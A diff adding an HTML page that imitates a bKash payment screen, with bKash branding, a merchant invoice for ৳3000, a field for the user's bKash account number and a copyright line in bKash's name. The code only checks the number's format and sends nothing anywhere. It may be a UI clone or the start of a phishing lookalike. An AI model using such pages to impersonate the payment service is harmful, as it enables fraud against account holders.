@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>bKash Payment</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #f2f2f2;
+    }
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: white;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .header {
+      background-color: #d40062;
+      padding: 20px;
+      text-align: center;
+      color: white;
+    }
+    .bkash-logo {
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .payment-info {
+      padding: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .payment-info .left {
+      font-size: 16px;
+    }
+    .payment-info .right {
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .form-section {
+      background-color: #d40062;
+      padding: 20px;
+      color: white;
+    }
+    
+    .form-section input {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        margin-top: 10px;
+        margin-right: 10px; /* decreases space on the right */
+        box-sizing: border-box;
+    }
+
+    .form-section p {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .form-section a {
+      color: #fff;
+      text-decoration: underline;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      padding: 20px;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .cancel-btn {
+      background-color: #f2f2f2;
+      color: black;
+    }
+    .confirm-btn {
+      background-color: grey;
+      color: white;
+    }
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      padding-bottom: 10px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="header">
+      <div class="bkash-logo">বিকাশ</div>
+    </div>
+
+    <div class="payment-info">
+      <div class="left">
+        <strong>Bijoy 24 Hall</strong><br>
+        Inv No: RSA174992233668
+      </div>
+      <div class="right">৳3000</div>
+    </div>
+
+    <div class="form-section">
+      <label for="bkash-number">Your bKash Account Number</label>
+      <input type="tel" id="bkash-number" placeholder="e.g 01XXXXXXXXX" oninput="handleInput()" />
+      <p>Confirm and proceed, <a href="#">terms & conditions</a></p>
+    </div>
+
+    <div class="buttons">
+      <button class="cancel-btn" onclick="alert('Cancelled')">Cancel</button>
+      <button id="confirmBtn" class="confirm-btn" disabled>Confirm</button>
+    </div>
+
+    <div class="footer">
+      📞 16247 <br>
+      © 2025 bKash, All Rights Reserved
+    </div>
+  </div>
+
+  <script>
+    function handleInput() {
+      const input = document.getElementById('bkash-number');
+      const confirmBtn = document.getElementById('confirmBtn');
+      confirmBtn.disabled = input.value.length !== 11 || !input.value.startsWith("01");
+      confirmBtn.style.backgroundColor = confirmBtn.disabled ? 'grey' : '#d40062';
+    }
+  </script>
+
+</body>
+</html>
